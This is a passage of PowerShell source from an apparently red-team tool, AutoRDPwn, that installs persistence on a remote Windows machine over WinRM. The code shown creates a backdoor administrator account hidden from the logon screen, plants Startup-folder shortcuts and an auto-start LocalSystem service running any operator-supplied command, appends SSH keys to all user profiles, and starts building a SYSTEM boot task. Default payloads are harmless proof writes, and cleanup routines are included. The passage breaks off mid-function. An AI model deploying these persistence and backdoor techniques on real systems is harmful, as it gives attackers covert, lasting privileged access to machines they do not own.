            New-ItemProperty -Path $hide -Name $userName -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
            $hidden = $true
        }
        catch { $hideError = $_.Exception.Message }
        $check = Get-LocalUser -Name $userName -ErrorAction SilentlyContinue
        $enabled = $false
        if ($null -ne $check) { $enabled = [bool]$check.Enabled }
        return [pscustomobject]@{
            Added            = $true
            Reason           = ''
            InAdmin          = $inAdmin
            AdminError       = $adminError
            Hidden           = $hidden
            HideError        = $hideError
            HideKeyExisted   = $hideKeyExisted
            HideValueExisted = $hideValueExisted
            HidePrior        = $hidePrior
            Enabled          = $enabled
        }
    }
    if (-not [bool]$result.Added) {
        if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedAccounts.Remove($accountName) }
        throw ('net user /add failed: ' + [string]$result.Reason)
    }
    $entry = [pscustomobject]@{
        KeyPath = $hidePath
        Name    = $accountName
        Existed = [bool]$result.HideValueExisted
        Value   = [int]$result.HidePrior
        Kind    = 'DWord'
    }
    $known = $false
    foreach ($existing in $script:ARRegistryBackup) {
        if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
    }
    if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    Write-ARSuccess ('Account created: ' + $accountName + ' (enabled=' + [string]$result.Enabled + ')')
    if ([bool]$result.InAdmin) { Write-ARInfo 'Added to the local Administrators group (S-1-5-32-544).' }
    else { Write-ARWarn ('The account was created but the Administrators group add failed: ' + [string]$result.AdminError) }
    if ([bool]$result.Hidden) {
        Write-ARInfo ('Hidden from the logon screen through ' + $hidePath + ' (value 0, registered for restore).')
    }
    else { Write-ARWarn ('The logon-screen hide value could not be written: ' + [string]$result.HideError) }
    Write-Host ''
    Write-Host ('  account : ' + $accountName) -ForegroundColor Gray
    Write-Host ('  password: ' + $password) -ForegroundColor Gray
    Write-Host '  shown here only: the password is never written to the log file.' -ForegroundColor DarkGray
    Write-ARInfo ('Cleanup: ' + $accountName + ' is in the account ledger, so session cleanup deletes it with net user /delete.')
    Write-ARInfo 'The password also travelled in the net.exe command line on the target, so it is visible there while the call runs.'
    Set-ARStatus 'Backdoor account created' 'Ok'
}

function Split-ARModuleExecutable {
    param([string]$Command)
    if ([string]::IsNullOrWhiteSpace($Command)) { throw 'The payload command is empty.' }
    if ($Command -match "[\r\n]") { throw 'The payload command must be a single line.' }
    $executable = $Command
    $argumentText = ''
    if ($Command.StartsWith('"')) {
        $closing = $Command.IndexOf('"', 1)
        if ($closing -lt 2) { throw 'The payload command opens a quote that is never closed.' }
        $executable = $Command.Substring(1, $closing - 1)
        $argumentText = $Command.Substring($closing + 1).Trim()
    }
    else {
        $space = $Command.IndexOf(' ')
        if ($space -gt 0) {
            $executable = $Command.Substring(0, $space)
            $argumentText = $Command.Substring($space + 1).Trim()
        }
    }
    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The payload command has no executable.' }
    return [pscustomobject]@{ Executable = $executable; Arguments = $argumentText }
}

function Invoke-ARModuleStartupShortcut {
    param([switch]$Remove)
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Startup folder shortcut'
    $session = Get-ARTargetSession
    if ($Remove) {
        $removal = Invoke-ARRemote -Session $session -ScriptBlock {
            $cap = 50
            $gone = New-Object System.Collections.Generic.List[string]
            $failures = New-Object System.Collections.Generic.List[string]
            $folders = New-Object System.Collections.Generic.List[string]
            $current = [Environment]::GetFolderPath('Startup')
            if (-not [string]::IsNullOrWhiteSpace($current)) { $folders.Add($current) }
            if (-not [string]::IsNullOrWhiteSpace($env:ProgramData)) {
                $common = Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Startup'
                if (-not $folders.Contains($common)) { $folders.Add($common) }
            }
            foreach ($folder in @($folders.ToArray())) {
                if (-not (Test-Path -LiteralPath $folder)) { continue }
                foreach ($file in @(Get-ChildItem -LiteralPath $folder -Filter 'AutoRDPwn*.lnk' -File -ErrorAction SilentlyContinue | Select-Object -First $cap)) {
                    try {
                        Remove-Item -LiteralPath $file.FullName -Force -ErrorAction Stop
                        if (Test-Path -LiteralPath $file.FullName) { $failures.Add([string]$file.FullName + ': still present after the delete') }
                        else { $gone.Add([string]$file.FullName) }
                    }
                    catch { $failures.Add([string]$file.FullName + ': ' + $_.Exception.Message) }
                }
            }
            return [pscustomobject]@{ Deleted = @($gone.ToArray()); Failed = @($failures.ToArray()) }
        }
        $removedPaths = @($removal.Deleted)
        foreach ($path in $removedPaths) {
            [void]$script:ARTemporaryFiles.Remove([string]$path)
            [void]$script:ARModuleFiles.Remove([string]$path)
            Write-ARSuccess ('Removed startup shortcut: ' + [string]$path)
        }
        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Shortcut removal failed: ' + [string]$item) }
        if ($removedPaths.Count -eq 0) { Write-ARInfo 'No AutoRDPwn shortcut is registered in the Startup folders.' }
        Set-ARStatus 'Startup shortcut removal finished' 'Ok'
        return [pscustomobject]@{
            Id      = '520'
            Action  = 'StartupShortcut'
            Mode    = 'remove'
            Target  = $target
            Removed = $removedPaths
            Failed  = @($removal.Failed)
        }
    }
    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn startup payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
    $command = $defaultCommand
    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the startup shortcut must launch' $defaultCommand }
    $split = Split-ARModuleExecutable -Command ([string]$command)
    $shortcutName = 'AutoRDPwn' + (New-ARModuleToken -Length 6) + '.lnk'
    $result = Invoke-ARRemote -Session $session -ArgumentList $shortcutName, $split.Executable, $split.Arguments -ScriptBlock {
        param($name, $execute, $argumentText)
        $created = New-Object System.Collections.Generic.List[object]
        $errors = New-Object System.Collections.Generic.List[string]
        $folders = New-Object System.Collections.Generic.List[object]
        $current = [Environment]::GetFolderPath('Startup')
        if (-not [string]::IsNullOrWhiteSpace($current)) { $folders.Add([pscustomobject]@{ Path = $current; Scope = 'current user' }) }
        if (-not [string]::IsNullOrWhiteSpace($env:ProgramData)) {
            $common = Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Startup'
            $known = $false
            foreach ($entry in @($folders.ToArray())) { if ([string]$entry.Path -eq $common) { $known = $true } }
            if (-not $known) { $folders.Add([pscustomobject]@{ Path = $common; Scope = 'all users' }) }
        }
        $shell = New-Object -ComObject WScript.Shell
        try {
            foreach ($entry in @($folders.ToArray())) {
                $folder = [string]$entry.Path
                if (-not (Test-Path -LiteralPath $folder)) { $errors.Add($folder + ': folder not found'); continue }
                $path = Join-Path $folder $name
                try {
                    $shortcut = $shell.CreateShortcut($path)
                    $shortcut.TargetPath = $execute
                    $shortcut.Arguments = $argumentText
                    $shortcut.WorkingDirectory = Split-Path -Parent $execute
                    $shortcut.WindowStyle = 7
                    $shortcut.Description = 'AutoRDPwn'
                    $shortcut.Save()
                    if (-not (Test-Path -LiteralPath $path)) { throw 'the .lnk file was not written' }
                    $check = $shell.CreateShortcut($path)
                    $created.Add([pscustomobject]@{
                        Path      = $path
                        Scope     = [string]$entry.Scope
                        Target    = [string]$check.TargetPath
                        Arguments = [string]$check.Arguments
                    })
                }
                catch { $errors.Add($path + ': ' + $_.Exception.Message) }
            }
        }
        finally {
            try { [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) } catch { }
        }
        return [pscustomobject]@{ Created = @($created.ToArray()); Errors = @($errors.ToArray()) }
    }
    $createdItems = @($result.Created)
    foreach ($item in @($result.Errors)) { Write-ARWarn ('Shortcut not created: ' + [string]$item) }
    if ($createdItems.Count -eq 0) { throw ('No startup shortcut could be created: ' + (@($result.Errors) -join '; ')) }
    foreach ($item in $createdItems) {
        $path = [string]$item.Path
        # ARTemporaryFiles is the report the interface reads; ARModuleFiles is the
        # collection Remove-ARModuleArtifacts deletes on the target before teardown.
        if (-not $script:ARTemporaryFiles.Contains($path)) { $script:ARTemporaryFiles.Add($path) }
        if (-not $script:ARModuleFiles.Contains($path)) { $script:ARModuleFiles.Add($path) }
        if ($command.Contains($proofLog) -and -not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
    }
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $lootDirectory = Get-ARLootDirectory 'persistence'
    $evidence = New-Object System.Collections.Generic.List[string]
    $index = 0
    foreach ($item in @($createdItems | Select-Object -First 8)) {
        $index++
        $localPath = Join-Path $lootDirectory ($safeTarget + '-startup-' + $stamp + '-' + $index + '.lnk')
        try {
            Receive-ARFileFromTarget -RemotePath ([string]$item.Path) -LocalPath $localPath -Session $session | Out-Null
            $evidence.Add($localPath)
        }
        catch { Write-ARWarn ('Shortcut copy could not be pulled: ' + $_.Exception.Message) }
    }
    Write-ARSuccess ('Startup shortcut created: ' + $shortcutName)
    foreach ($item in $createdItems) { Write-ARInfo ('  ' + [string]$item.Scope + ': ' + [string]$item.Path) }
    Write-ARInfo ('  target: ' + [string]$split.Executable + ' ' + [string]$split.Arguments)
    if ($evidence.Count -gt 0) { Write-ARInfo ('  copies pulled to: ' + $evidence[0]) }
    if ($command.Contains($proofLog)) { Write-ARInfo ('  the payload appends its proof to ' + $proofLog + ' at the next logon of that profile.') }
    Set-ARStatus 'Startup shortcut installed' 'Ok'
    return [pscustomobject]@{
        Id       = '520'
        Action   = 'StartupShortcut'
        Mode     = 'install'
        Target   = $target
        Shortcut = $shortcutName
        Command  = [string]$command
        Created  = @($createdItems | ForEach-Object { [string]$_.Path })
        Loot     = @($evidence.ToArray())
        Removed  = $false
    }
}

function Invoke-ARModuleSshAuthorizedKeys {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SSH authorized_keys'
    $session = Get-ARTargetSession
    $defaultKey = ''
    if (-not [string]::IsNullOrWhiteSpace($env:USERPROFILE)) {
        $keyFolder = Join-Path $env:USERPROFILE '.ssh'
        foreach ($candidate in @(Get-ChildItem -LiteralPath $keyFolder -Filter '*.pub' -File -ErrorAction SilentlyContinue | Select-Object -First 10)) {
            try {
                $line = ([System.IO.File]::ReadAllText($candidate.FullName) -split "`r?`n")[0].Trim()
                if ($line -match '^(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh.com|sk-ecdsa-sha2-nistp256@openssh.com)\s+[A-Za-z0-9+/=]+') {
                    $defaultKey = $line
                    break
                }
            }
            catch { }
        }
    }
    $publicKey = $defaultKey
    if (-not $script:ARInvokedFromOption) { $publicKey = Read-ARValue 'Public key to append (ssh-rsa or ssh-ed25519)' $defaultKey }
    $publicKey = ([string]$publicKey).Trim()
    if ($publicKey.Length -eq 0 -or $publicKey.Length -gt 8192) { throw 'The public key must be one OpenSSH line of at most 8192 characters.' }
    if ($publicKey -match "[\r\n]") { throw 'The public key must be a single line; the comment field cannot carry a line break.' }
    if ($publicKey -notmatch '^(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp256|ecdsa-sha2-nistp384|ecdsa-sha2-nistp521|sk-ssh-ed25519@openssh.com|sk-ecdsa-sha2-nistp256@openssh.com)\s+[A-Za-z0-9+/=]+') {
        throw 'The public key is not OpenSSH format: expected "<type> <base64> [comment]".'
    }
    $keyParts = @($publicKey -split '\s+')
    $profiles = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 100
        $found = New-Object System.Collections.Generic.List[object]
        $root = Join-Path $env:SystemDrive 'Users'
        if (-not (Test-Path -LiteralPath $root)) { return @() }
        foreach ($profile in @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))) {
            if ($found.Count -ge $cap) { break }
            $ssh = Join-Path $profile.FullName '.ssh'
            if (-not (Test-Path -LiteralPath $ssh -PathType Container)) { continue }
            $keys = Join-Path $ssh 'authorized_keys'
            $found.Add([pscustomobject]@{ Profile = [string]$profile.Name; Path = $keys; Exists = [bool](Test-Path -LiteralPath $keys) })
        }
        return $found.ToArray()
    }
    $plans = New-Object System.Collections.Generic.List[object]
    foreach ($profile in @($profiles | Select-Object -First 100)) {
        $plans.Add([pscustomobject]@{
            Profile = [string]$profile.Profile
            Path    = [string]$profile.Path
            Existed = [bool]$profile.Exists
            Backup  = ('C:\Windows\Temp\' + (New-ARRemoteTempName '.bak'))
        })
    }
    if ($plans.Count -eq 0) {
        Write-ARInfo 'No user profile on the target has a .ssh directory, so there is nothing to append to.'
        Set-ARStatus 'SSH authorized_keys: no profile found' 'Ok'
        return [pscustomobject]@{
            Id       = '521'
            Action   = 'SshAuthorizedKeys'
            Target   = $target
            Key      = $keyParts[0]
            Profiles = @()
            Appended = 0
            Restored = $false
            Loot     = @()
        }
    }
    $applied = @()
    try {
        $request = [pscustomobject]@{ Plans = @($plans.ToArray()); Key = $publicKey }
        $applied = @(Invoke-ARRemote -Session $session -ArgumentList $request -ScriptBlock {
            param($request)
            $results = New-Object System.Collections.Generic.List[object]
            foreach ($plan in @($request.Plans)) {
                $entry = [pscustomobject]@{
                    Profile        = [string]$plan.Profile
                    Path           = [string]$plan.Path
                    Backup         = [string]$plan.Backup
                    Existed        = [bool]$plan.Existed
                    Appended       = $false
                    AlreadyPresent = $false
                    Error          = ''
                }
                try {
                    $path = [string]$plan.Path
                    $backup = [string]$plan.Backup
                    if ([bool]$plan.Existed) { Copy-Item -LiteralPath $path -Destination $backup -Force -ErrorAction Stop }
                    $current = ''
                    if ([bool]$plan.Existed) { $current = [System.IO.File]::ReadAllText($path) }
                    if ($current.Contains([string]$request.Key)) { $entry.AlreadyPresent = $true }
                    else {
                        $prefix = ''
                        if ($current.Length -gt 0 -and -not $current.EndsWith("`n")) { $prefix = "`r`n" }
                        [System.IO.File]::AppendAllText($path, ($prefix + [string]$request.Key + "`r`n"), (New-Object System.Text.UTF8Encoding($false)))
                        $after = [System.IO.File]::ReadAllText($path)
                        if (-not $after.Contains([string]$request.Key)) { throw 'the key is not in the file after the append' }
                        $entry.Appended = $true
                    }
                }
                catch { $entry.Error = $_.Exception.Message }
                $results.Add($entry)
            }
            return $results.ToArray()
        })
        $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
        $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
        $evidence = New-Object System.Collections.Generic.List[string]
        $index = 0
        foreach ($entry in @($applied)) {
            if ([string]$entry.Error -ne '') { Write-ARWarn ('authorized_keys not written for ' + [string]$entry.Profile + ': ' + [string]$entry.Error) }
            elseif ([bool]$entry.AlreadyPresent) { Write-ARInfo ('Key already present for ' + [string]$entry.Profile + ': ' + [string]$entry.Path) }
            else { Write-ARSuccess ('Key appended for ' + [string]$entry.Profile + ': ' + [string]$entry.Path) }
            if ([string]$entry.Error -ne '' -or $index -ge 10) { continue }
            $index++
            $localPath = Join-Path (Get-ARLootDirectory 'ssh') ($safeTarget + '-authorized_keys-' + $stamp + '-' + $index + '.txt')
            try {
                Receive-ARFileFromTarget -RemotePath ([string]$entry.Path) -LocalPath $localPath -Session $session | Out-Null
                $evidence.Add($localPath)
            }
            catch { Write-ARWarn ('authorized_keys copy could not be pulled: ' + $_.Exception.Message) }
        }
    }
    finally {
        $restoreResult = $null
        try {
            $restoreResult = Invoke-ARRemote -Session $session -ArgumentList (, @($plans.ToArray())) -ScriptBlock {
                param($items)
                $restored = New-Object System.Collections.Generic.List[string]
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($plan in @($items)) {
                    try {
                        $path = [string]$plan.Path
                        $backup = [string]$plan.Backup
                        $existed = [bool]$plan.Existed
                        if ($existed) {
                            if (-not (Test-Path -LiteralPath $backup)) { throw 'the backup file is missing' }
                            Copy-Item -LiteralPath $backup -Destination $path -Force -ErrorAction Stop
                        }
                        elseif (Test-Path -LiteralPath $path) { Remove-Item -LiteralPath $path -Force -ErrorAction Stop }
                        if (Test-Path -LiteralPath $backup) { Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue }
                        $restored.Add($path)
                    }
                    catch { $failed.Add([string]$plan.Path + ': ' + $_.Exception.Message) }
                }
                return [pscustomobject]@{ Restored = @($restored.ToArray()); Failed = @($failed.ToArray()) }
            }
        }
        catch { Write-ARWarn ('authorized_keys restore incomplete: ' + $_.Exception.Message) }
        if ($null -ne $restoreResult) {
            foreach ($item in @($restoreResult.Restored)) { Write-ARInfo ('Original file restored: ' + [string]$item) }
            foreach ($item in @($restoreResult.Failed)) { Write-ARWarn ('Restore failed: ' + [string]$item) }
        }
    }
    $added = @($applied | Where-Object { [bool]$_.Appended }).Count
    $alreadyThere = @($applied | Where-Object { [bool]$_.AlreadyPresent }).Count
    $failed = @($applied | Where-Object { [string]$_.Error -ne '' }).Count
    $keyLabel = $keyParts[0]
    if ($keyParts.Count -gt 1) { $keyLabel = $keyLabel + ' ' + $keyParts[1].Substring(0, [Math]::Min(24, $keyParts[1].Length)) + '...' }
    Write-ARInfo ('Profiles with .ssh: ' + $plans.Count + '; keys appended: ' + $added + '; already present: ' + $alreadyThere + '; failed: ' + $failed + '.')
    Write-ARInfo 'The original files were restored in the finally block: nothing stays appended after this action.'
    Set-ARStatus 'SSH authorized_keys proof finished' 'Ok'
    return [pscustomobject]@{
        Id       = '521'
        Action   = 'SshAuthorizedKeys'
        Target   = $target
        Key      = $keyLabel
        Profiles = @($plans | ForEach-Object { [string]$_.Path })
        Appended = [int]$added
        Failed   = [int]$failed
        Restored = $true
        Loot     = @($evidence.ToArray())
    }
}

function Invoke-ARModuleServicePersistence {
    param([switch]$Remove)
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Auto-start service persistence'
    $session = Get-ARTargetSession
    if ($Remove) {
        $ledger = New-Object System.Collections.Generic.List[string]
        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) {
            foreach ($name in @($script:ARCreatedServices.ToArray())) {
                if (([string]$name).StartsWith('AutoRDPwnAuto')) { $ledger.Add([string]$name) }
            }
        }
        $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
            param($names)
            $deleted = New-Object System.Collections.Generic.List[string]
            $failed = New-Object System.Collections.Generic.List[string]
            $all = New-Object System.Collections.Generic.List[string]
            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
            foreach ($service in @(Get-Service -Name 'AutoRDPwnAuto*' -ErrorAction SilentlyContinue)) {
                if (-not $all.Contains([string]$service.Name)) { $all.Add([string]$service.Name) }
            }
            foreach ($name in @($all.ToArray())) {
                $existed = ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue))
                & sc.exe stop $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    $current = Get-Service -Name $name -ErrorAction SilentlyContinue
                    if ($null -eq $current) { break }
                    if ([string]$current.Status -eq 'Stopped') { break }
                    Start-Sleep -Milliseconds 250
                }
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
                if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
                    if ($existed) { $deleted.Add($name) }
                }
                else { $failed.Add($name + ': still registered after sc.exe delete') }
            }
            return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($failed.ToArray()) }
        }
        $removedNames = @($removal.Deleted)
        foreach ($name in $removedNames) {
            if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedServices.Remove([string]$name) }
            Write-ARSuccess ('Removed service: ' + [string]$name)
        }
        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Service removal failed: ' + [string]$item) }
        if ($removedNames.Count -eq 0) { Write-ARInfo 'No AutoRDPwn auto-start service is registered on the target.' }
        Set-ARStatus 'Auto-start service removal finished' 'Ok'
        return [pscustomobject]@{
            Id      = '522'
            Action  = 'ServicePersistence'
            Mode    = 'remove'
            Target  = $target
            Removed = $removedNames
            Failed  = @($removal.Failed)
        }
    }
    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn service payload ran at %DATE% %TIME% >> "' + $proofLog + '"'
    $command = $defaultCommand
    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the auto-start service must run' $defaultCommand }
    $split = Split-ARModuleExecutable -Command ([string]$command)
    $serviceName = 'AutoRDPwnAuto' + (New-ARModuleToken -Length 6)
    $binPath = '"' + $split.Executable + '"'
    if (-not [string]::IsNullOrWhiteSpace($split.Arguments)) { $binPath = $binPath + ' ' + $split.Arguments }
    $proof = ''
    try {
        $result = Invoke-ARRemote -Session $session -ArgumentList $serviceName, $binPath -ScriptBlock {
            param($name, $path)
            if ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
                & sc.exe stop $name 2>&1 | Out-Null
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
            }
            New-Service -Name $name -BinaryPathName $path -DisplayName 'AutoRDPwn helper' -StartupType Automatic -ErrorAction Stop | Out-Null
            $config = [string](& sc.exe qc $name 2>&1 | Out-String)
            $startOutput = [string](& sc.exe start $name 2>&1 | Out-String)
            $startCode = $LASTEXITCODE
            Start-Sleep -Seconds 2
            $startTypeCode = -1
            $match = [regex]::Match($config, '(?m)START_TYPE\s*:\s*(\d+)')
            if ($match.Success) { $startTypeCode = [int]$match.Groups[1].Value }
            $service = Get-Service -Name $name -ErrorAction SilentlyContinue
            $state = 'missing'
            if ($null -ne $service) { $state = [string]$service.Status }
            return [pscustomobject]@{
                Name          = $name
                BinPath       = $path
                StartCode     = [int]$startCode
                StartOutput   = $startOutput.Trim()
                State         = $state
                StartTypeCode = [int]$startTypeCode
            }
        }
        # Registered before the verification: a failure after the create still
        # names the service, and the finally below is what removes it.
        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) {
            if (-not $script:ARCreatedServices.Contains($serviceName)) { $script:ARCreatedServices.Add($serviceName) }
        }
        if ([int]$result.StartTypeCode -ne 2) { throw ('The service was created but sc qc reports start type ' + [string]$result.StartTypeCode + ' instead of AUTO_START (2).') }
        Write-ARSuccess ('Service created: ' + $serviceName + ' (LocalSystem, start= auto)')
        Write-ARInfo ('  binPath = ' + [string]$result.BinPath)
        if ([int]$result.StartCode -ne 0) {
            Write-ARInfo ('  sc start exit ' + [string]$result.StartCode + ': ' + [string]$result.StartOutput)
            Write-ARInfo '  A 1053 here means the command ran and exited before reporting back, which is normal for a one-shot payload.'
        }
        else { Write-ARInfo ('  service state now: ' + [string]$result.State) }
        if ($command.Contains($proofLog)) {
            if (-not $script:ARModuleFiles.Contains($proofLog)) { $script:ARModuleFiles.Add($proofLog) }
            for ($attempt = 0; $attempt -lt 20; $attempt++) {
                Start-Sleep -Seconds 1
                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
                    param($path)
                    if (-not (Test-Path -LiteralPath $path)) { return '' }
                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
                })
                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
            }
            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof line appeared: the service started but the command wrote nothing.' }
            else {
                Write-ARSuccess 'The service ran this command as LocalSystem:'
                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 20) -join "`n")
                $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
                $localProof = Join-Path (Get-ARLootDirectory 'persistence') ($safeTarget + '-service-proof-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.log')
                try { Receive-ARFileFromTarget -RemotePath $proofLog -LocalPath $localProof -Session $session | Out-Null }
                catch { Write-ARWarn ('Proof copy could not be pulled: ' + $_.Exception.Message) }
            }
        }
    }
    finally {
        # The target has no service sweep at session end: this handler deletes the
        # service it created, both when the body throws and when it completes.
        try {
            $left = Invoke-ARRemote -Session $session -ArgumentList $serviceName -ScriptBlock {
                param($name)
                & sc.exe stop $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    $current = Get-Service -Name $name -ErrorAction SilentlyContinue
                    if ($null -eq $current) { break }
                    if ([string]$current.Status -eq 'Stopped') { break }
                    Start-Sleep -Milliseconds 250
                }
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
                return @(Get-Service -Name $name -ErrorAction SilentlyContinue).Count
            }
            if ([int]$left -eq 0) { Write-ARInfo ('Service removed: ' + $serviceName + ' (nothing is left registered)') }
            else { Write-ARWarn ('Service still registered after the delete: ' + $serviceName + ' — remove it with sc.exe delete.') }
        }
        catch { Write-ARWarn ('Service removal incomplete: ' + $_.Exception.Message + ' — remove ' + $serviceName + ' with sc.exe delete.') }
        if (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedServices.Remove($serviceName) }
        if ($command.Contains($proofLog)) {
            try {
                Invoke-ARRemote -Session $session -ArgumentList $proofLog -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
                } | Out-Null
            }
            catch { }
            [void]$script:ARModuleFiles.Remove($proofLog)
        }
    }
    Set-ARStatus 'Auto-start service persistence finished' 'Ok'
    return [pscustomobject]@{
        Id       = '522'
        Action   = 'ServicePersistence'
        Mode     = 'install'
        Target   = $target
        Service  = $serviceName
        BinPath  = $binPath
        Command  = [string]$command
        Proof    = ([string]$proof).Trim()
        Removed  = $true
    }
}

function Invoke-ARModuleBootTask {
    param([switch]$Remove)
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Boot scheduled task'
    $session = Get-ARTargetSession
    if ($Remove) {
        $ledger = New-Object System.Collections.Generic.List[string]
        if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
            foreach ($name in @($script:ARRemoteTasks.ToArray())) {
                if (([string]$name).StartsWith('AutoRDPwnBoot')) { $ledger.Add([string]$name) }
            }
        }
        $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
            param($names)
            $deleted = New-Object System.Collections.Generic.List[string]
            $failed = New-Object System.Collections.Generic.List[string]
            $all = New-Object System.Collections.Generic.List[string]
            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
            # Interrupted runs leave the prefix behind; the sweep uses the same one.
            foreach ($task in @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { [string]$_.TaskName -like 'AutoRDPwnBoot*' } | Select-Object -First 100)) {
                if (-not $all.Contains([string]$task.TaskName)) { $all.Add([string]$task.TaskName) }
            }
            foreach ($name in @($all.ToArray())) {
                $existed = ($null -ne (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue))
                & schtasks.exe /end /tn $name 2>&1 | Out-Null
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                if ($null -eq (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue)) {
                    if ($existed) { $deleted.Add($name) }
                }
                else { $failed.Add($name + ': still registered after Unregister-ScheduledTask') }
            }
            return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($failed.ToArray()) }
        }
        $removedNames = @($removal.Deleted)
        foreach ($name in $removedNames) {
            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove([string]$name) }
            Write-ARSuccess ('Removed boot task: ' + [string]$name)
        }
        foreach ($item in @($removal.Failed)) { Write-ARWarn ('Boot task removal failed: ' + [string]$item) }
        if ($removedNames.Count -eq 0) { Write-ARInfo 'No AutoRDPwn boot task is registered on the target.' }
        Set-ARStatus 'Boot task removal finished' 'Ok'
        return [pscustomobject]@{
            Id      = '523'
            Action  = 'BootTask'
            Mode    = 'remove'
            Target  = $target
            Removed = $removedNames
            Failed  = @($removal.Failed)
        }
    }
    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c echo AutoRDPwn boot task ran at %DATE% %TIME% >> "' + $proofLog + '"'
    $command = $defaultCommand
    if (-not $script:ARInvokedFromOption) { $command = Read-ARValue 'Command the boot task must run as SYSTEM' $defaultCommand }
    $split = Split-ARModuleExecutable -Command ([string]$command)
    $taskName = 'AutoRDPwnBoot' + (New-ARModuleToken -Length 6)
    $result = Invoke-ARRemote -Session $session -ArgumentList $taskName, $split.Executable, $split.Arguments -ScriptBlock {
        param($name, $execute, $argumentText)
        $action = New-ScheduledTaskAction -Execute $execute -Argument $argumentText
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
